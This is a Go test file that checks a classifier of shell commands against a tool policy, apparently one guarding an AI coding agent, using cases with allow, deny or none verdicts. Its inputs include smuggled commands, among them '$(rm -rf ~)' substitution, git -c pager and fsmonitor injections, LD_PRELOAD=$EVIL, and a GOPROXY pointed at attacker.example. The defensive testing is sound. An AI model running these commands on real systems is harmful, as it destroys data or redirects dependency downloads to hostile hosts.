package main

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestClassify(t *testing.T) {
	type testCase struct {
		_id       string
		_expected string

		cmd string
	}

	policy := defaultToolpolicy(t)

	tests := make([]*testCase, 0)

	// screenshot-probe-jq-batch
	tests = append(tests, &testCase{
		_id:       "screenshot-probe-jq-batch",
		_expected: "allow",

		cmd: `SIB=/Users/devuser/GolandProjects/claude-configs/.claude/worktrees/skillroutine-eval-railroad-review-09145b/skills/quality/railroad-review/eval/golden/smine-1.1.4-1.2.1.g2.v2.master.json; echo "=== resolved[] full (count + all) ==="; jq '.resolved | length' $SIB; jq -c '.resolved[]' $SIB 2>&1 | head -60; echo "=== does any field track 48 fixed? search master for 48 ==="; jq '.. | strings | select(test("48"))' $SIB 2>&1 | head`,
	})

	// screenshot-probe-find-batch
	tests = append(tests, &testCase{
		_id:       "screenshot-probe-find-batch",
		_expected: "allow",

		cmd: `RUN=/Users/devuser/GolandProjects/claude-configs/.claude/worktrees/skillroutine-eval-railroad-review-09145b/evals/railroad-review/2026-09-16-a34281/runs/fable-5-session-r1-193132; echo "=== cleanup/salvage refs in run dir ==="; find $RUN -iname '*cleanup*' -o -iname '*salvage*' 2>&1; echo "=== salvage dir contents ==="; ls -la $RUN/artifacts/round-1/salvage/ 2>&1 | head; echo "=== grep cleanup in eval.json/stats.json ==="; grep -io 'cleanup[^"]*\|residue\|worktree[^"]*removed\|145 entries\|zero skipped' $RUN/../../eval.json /Users/devuser/GolandProjects/claude-configs/.claude/worktrees/skillroutine-eval-railroad-review-09145b/evals/railroad-review/2026-09-16-a34281/eval.json 2>&1 | head; echo "=== stale-archive ==="; ls -la /Users/devuser/.cache/claude-routine/worktrees/.stale-archive/ 2>&1`,
	})

	// screenshot-probe-binary-run
	tests = append(tests, &testCase{
		_id:       "screenshot-probe-binary-run",
		_expected: "deny",

		cmd: `echo "=== peek-mcp binary version via strings ==="; strings /Users/devuser/go/bin/peek-mcp 2>/dev/null | grep -E '^1\.2\.[0-9]$|peek.*1\.2|version.*1\.2' | head; echo "--- try running (may be MCP stdio) ---"; timeout 3 /Users/devuser/go/bin/peek-mcp --version 2>&1 | head -3; echo "--- repo docs/README version ---"; grep -rniE 'v?1\.2\.6|version.{0,10}1\.2' /Users/devuser/GolandProjects/peek-mcp/README.md /Users/devuser/GolandProjects/peek-mcp/docs 2>/dev/null | head`,
	})

	// cmdsubst-rm-injection
	tests = append(tests, &testCase{
		_id:       "cmdsubst-rm-injection",
		_expected: "deny",

		cmd: `jq $(rm -rf ~) x.json; ls`,
	})

	// backtick-rm-injection
	tests = append(tests, &testCase{
		_id:       "backtick-rm-injection",
		_expected: "deny",

		cmd: "cat `rm -f /tmp/x`; echo done",
	})

	// separators-inside-quotes-single
	tests = append(tests, &testCase{
		_id:       "separators-inside-quotes-single",
		_expected: "allow",

		cmd: `grep 'a\|b; c' file.txt`,
	})

	// redirect-to-file-single
	tests = append(tests, &testCase{
		_id:       "redirect-to-file-single",
		_expected: "none",

		cmd: `ls > out.txt`,
	})

	// redirect-to-file-compound
	tests = append(tests, &testCase{
		_id:       "redirect-to-file-compound",
		_expected: "deny",

		cmd: `ls > out.txt; cat out.txt`,
	})

	// find-exec
	tests = append(tests, &testCase{
		_id:       "find-exec",
		_expected: "deny",

		cmd: `find . -name '*.tmp' -exec rm {} \; ; echo done`,
	})

	// find-delete-single
	tests = append(tests, &testCase{
		_id:       "find-delete-single",
		_expected: "none",

		cmd: `find . -name '*.tmp' -delete`,
	})

	// sed-in-place-compound
	tests = append(tests, &testCase{
		_id:       "sed-in-place-compound",
		_expected: "deny",

		cmd: `sed -i '' s/a/b/ f; ls`,
	})

	// sed-print-only-pipe
	tests = append(tests, &testCase{
		_id:       "sed-print-only-pipe",
		_expected: "allow",

		cmd: `sed -n '1,10p' file.go | wc -l`,
	})

	// sed-write-command
	tests = append(tests, &testCase{
		_id:       "sed-write-command",
		_expected: "deny",

		cmd: `sed -n 'w /tmp/out' f; ls`,
	})

	// git-read-batch
	tests = append(tests, &testCase{
		_id:       "git-read-batch",
		_expected: "allow",

		cmd: `git status; git log --oneline | head -5`,
	})

	// git-push-compound
	tests = append(tests, &testCase{
		_id:       "git-push-compound",
		_expected: "deny",

		cmd: `git push; ls`,
	})

	// git-c-flag-read
	tests = append(tests, &testCase{
		_id:       "git-c-flag-read",
		_expected: "allow",

		cmd: `git -C /tmp/repo status`,
	})

	// git-c-config-injection-single
	tests = append(tests, &testCase{
		_id:       "git-c-config-injection-single",
		_expected: "none",

		cmd: `git -c core.fsmonitor='touch /tmp/x' status`,
	})

	// git-c-config-injection-compound
	tests = append(tests, &testCase{
		_id:       "git-c-config-injection-compound",
		_expected: "deny",

		cmd: `git -c diff.external='touch /tmp/x' diff; ls`,
	})

	// git-c-pager-injection-compound
	tests = append(tests, &testCase{
		_id:       "git-c-pager-injection-compound",
		_expected: "deny",

		cmd: `git -c core.pager='touch /tmp/x' -c pager.status=true status; echo done`,
	})

	// go-env-write-single
	tests = append(tests, &testCase{
		_id:       "go-env-write-single",
		_expected: "none",

		cmd: `go env -w GOPROXY=http://attacker.example/proxy`,
	})

	// go-env-read
	tests = append(tests, &testCase{
		_id:       "go-env-read",
		_expected: "allow",

		cmd: `go env GOPROXY`,
	})

	// nonliteral-assign-prefix-single
	tests = append(tests, &testCase{
		_id:       "nonliteral-assign-prefix-single",
		_expected: "none",

		cmd: `LD_PRELOAD=$EVIL cat file.txt`,
	})

	// nonliteral-assign-prefix-compound
	tests = append(tests, &testCase{
		_id:       "nonliteral-assign-prefix-compound",
		_expected: "deny",

		cmd: `LD_PRELOAD=$EVIL cat file.txt; echo done`,
	})

	// nonliteral-assign-statement-compound
	tests = append(tests, &testCase{
		_id:       "nonliteral-assign-statement-compound",
		_expected: "deny",

		cmd: `LD_PRELOAD=$EVIL; cat file.txt`,
	})

	// literal-assign-prefix
	tests = append(tests, &testCase{
		_id:       "literal-assign-prefix",
		_expected: "allow",

		cmd: `FOO=bar cat file.txt`,
	})

	// git-branch-create-compound
	tests = append(tests, &testCase{
		_id:       "git-branch-create-compound",
		_expected: "deny",

		cmd: `git branch new-feature; git status`,
	})

	// unparseable-trailing-and
	tests = append(tests, &testCase{
		_id:       "unparseable-trailing-and",
		_expected: "deny",

		cmd: `foo &&`,
	})

	// single-non-readonly
	tests = append(tests, &testCase{
		_id:       "single-non-readonly",
		_expected: "none",

		cmd: `go run ./cmd/acdsl check`,
	})

	// empty-input
	tests = append(tests, &testCase{
		_id:       "empty-input",
		_expected: "none",

		cmd: ``,
	})

	// background-compound
	tests = append(tests, &testCase{
		_id:       "background-compound",
		_expected: "deny",

		cmd: `sleep 100 & ls`,
	})

	// variable-head-compound
	tests = append(tests, &testCase{
		_id:       "variable-head-compound",
		_expected: "deny",

		cmd: `CMD=rm; $CMD -rf /tmp/x; echo done`,
	})

	// timeout-wrapped-readonly
	tests = append(tests, &testCase{
		_id:       "timeout-wrapped-readonly",
		_expected: "allow",

		cmd: `timeout 5 grep -r pattern .; echo done`,
	})

	// procsubst-readonly
	tests = append(tests, &testCase{
		_id:       "procsubst-readonly",
		_expected: "allow",

		cmd: `diff <(sort a.txt) <(sort b.txt)`,
	})

	// heredoc-write
	tests = append(tests, &testCase{
		_id:       "heredoc-write",
		_expected: "deny",

		cmd: "cat <<EOF > /tmp/f\nhello\nEOF\nls",
	})

	// pipeline-into-nonreadonly
	tests = append(tests, &testCase{
		_id:       "pipeline-into-nonreadonly",
		_expected: "deny",

		cmd: `cat list.txt | xargs rm`,
	})

	// git-grep-head-batch
	tests = append(tests, &testCase{
		_id:       "git-grep-head-batch",
		_expected: "allow",

		cmd: `git grep -n 'device_limit\|android-bs' HEAD -- cfapi/models/schema/couchfunk-api.sql | head -5`,
	})

	// git-branch-list-batch
	tests = append(tests, &testCase{
		_id:       "git-branch-list-batch",
		_expected: "allow",

		cmd: `git branch -a | grep -iE 'device|split' | head -40 && git log --oneline -1 origin/develop`,
	})

	// git-branch-bare
	tests = append(tests, &testCase{
		_id:       "git-branch-bare",
		_expected: "allow",

		cmd: `git branch --show-current; git branch --list 'claude/*'`,
	})

	// git-branch-create-not-readonly
	tests = append(tests, &testCase{
		_id:       "git-branch-create-not-readonly",
		_expected: "none",

		cmd: `git branch login-simplification-pr-split/1-worker-move`,
	})

	// git-branch-delete-behind-list-flag
	tests = append(tests, &testCase{
		_id:       "git-branch-delete-behind-list-flag",
		_expected: "deny",

		cmd: `git branch -a -D claude/x; ls`,
	})

	// git-branch-set-upstream-eq
	tests = append(tests, &testCase{
		_id:       "git-branch-set-upstream-eq",
		_expected: "none",

		cmd: `git branch --set-upstream-to=origin/develop`,
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			verdict := Classify(test.cmd, policy)
			assert.Equalf(t, test._expected, verdict.Decision, "reason = %s", verdict.Reason)
		})
	}
}

func TestPipelineSegments(t *testing.T) {
	type testCase struct {
		_id            string
		_expectedOk    bool
		_expectedTexts []string

		cmd string
	}

	policy := defaultToolpolicy(t)

	tests := make([]*testCase, 0)

	// go-test-tail-with-redirect
	tests = append(tests, &testCase{
		_id:            "go-test-tail-with-redirect",
		_expectedOk:    true,
		_expectedTexts: []string{"go test ./... 2>&1", "tail -20"},

		cmd: `go test ./... 2>&1 | tail -20`,
	})

	// curl-jq
	tests = append(tests, &testCase{
		_id:            "curl-jq",
		_expectedOk:    true,
		_expectedTexts: []string{"curl -s localhost:8080/x", "jq ."},

		cmd: `curl -s localhost:8080/x | jq .`,
	})

	// literal-assign-prefix
	tests = append(tests, &testCase{
		_id:            "literal-assign-prefix",
		_expectedOk:    true,
		_expectedTexts: []string{"FOO=bar go test ./...", "head"},

		cmd: `FOO=bar go test ./... | head`,
	})

	// two-pipes
	tests = append(tests, &testCase{
		_id:         "two-pipes",
		_expectedOk: false,

		cmd: `go test ./... | tail | wc -l`,
	})

	// and-chain
	tests = append(tests, &testCase{
		_id:         "and-chain",
		_expectedOk: false,

		cmd: `go test ./... && ls`,
	})

	// semicolon-chain
	tests = append(tests, &testCase{
		_id:         "semicolon-chain",
		_expectedOk: false,

		cmd: `go test ./... ; ls`,
	})

	// pipe-all
	tests = append(tests, &testCase{
		_id:         "pipe-all",
		_expectedOk: false,

		cmd: `go test ./... |& tail`,
	})

	// background
	tests = append(tests, &testCase{
		_id:         "background",
		_expectedOk: false,

		cmd: `go test ./... | cat &`,
	})

	// negated
	tests = append(tests, &testCase{
		_id:         "negated",
		_expectedOk: false,

		cmd: `! go test ./... | cat`,
	})

	// unsafe-redirect
	tests = append(tests, &testCase{
		_id:         "unsafe-redirect",
		_expectedOk: false,

		cmd: `go test ./... > out.txt | cat`,
	})

	// nonliteral-arg
	tests = append(tests, &testCase{
		_id:         "nonliteral-arg",
		_expectedOk: false,

		cmd: `go test $PKG | tail`,
	})

	// nonliteral-assign
	tests = append(tests, &testCase{
		_id:         "nonliteral-assign",
		_expectedOk: false,

		cmd: `LD_PRELOAD=$EVIL go test ./... | tail`,
	})

	// nonliteral-head
	tests = append(tests, &testCase{
		_id:         "nonliteral-head",
		_expectedOk: false,

		cmd: `cat f | $CMD`,
	})

	// single-command
	tests = append(tests, &testCase{
		_id:         "single-command",
		_expectedOk: false,

		cmd: `go test ./...`,
	})

	// empty
	tests = append(tests, &testCase{
		_id:         "empty",
		_expectedOk: false,

		cmd: ``,
	})

	// bare-pipe
	tests = append(tests, &testCase{
		_id:         "bare-pipe",
		_expectedOk: false,

		cmd: `|`,
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			segments, ok := pipelineSegments(test.cmd, policy)
			var texts []string
			for _, segment := range segments {
				texts = append(texts, segment.text)
			}
			assert.Equal(t, test._expectedOk, ok)
			assert.Equal(t, test._expectedTexts, texts)
		})
	}
}

func TestCdTargets(t *testing.T) {
	type testCase struct {
		_id              string
		_expectedTargets []string

		cmd string
	}

	policy := defaultToolpolicy(t)

	tests := make([]*testCase, 0)

	// cd-absolute
	tests = append(tests, &testCase{
		_id:              "cd-absolute",
		_expectedTargets: []string{"/a/b"},

		cmd: `cd /a/b`,
	})

	// cd-in-and-chain
	tests = append(tests, &testCase{
		_id:              "cd-in-and-chain",
		_expectedTargets: []string{"~/.claude/skills/x"},

		cmd: `cd ~/.claude/skills/x && grep y z`,
	})

	// pushd
	tests = append(tests, &testCase{
		_id:              "pushd",
		_expectedTargets: []string{".git/hooks"},

		cmd: `pushd .git/hooks`,
	})

	// cd-flag-then-dir
	tests = append(tests, &testCase{
		_id:              "cd-flag-then-dir",
		_expectedTargets: []string{"build"},

		cmd: `cd -P build`,
	})

	// cd-bare
	tests = append(tests, &testCase{
		_id:              "cd-bare",
		_expectedTargets: []string{},

		cmd: `cd`,
	})

	// cd-dash
	tests = append(tests, &testCase{
		_id:              "cd-dash",
		_expectedTargets: []string{},

		cmd: `cd -`,
	})

	// cd-non-literal
	tests = append(tests, &testCase{
		_id:              "cd-non-literal",
		_expectedTargets: []string{},

		cmd: `cd "$HOME/x"`,
	})

	// no-cd
	tests = append(tests, &testCase{
		_id:              "no-cd",
		_expectedTargets: []string{},

		cmd: `grep x y`,
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			assert.Equal(t, test._expectedTargets, cdTargets(test.cmd, policy))
		})
	}
}
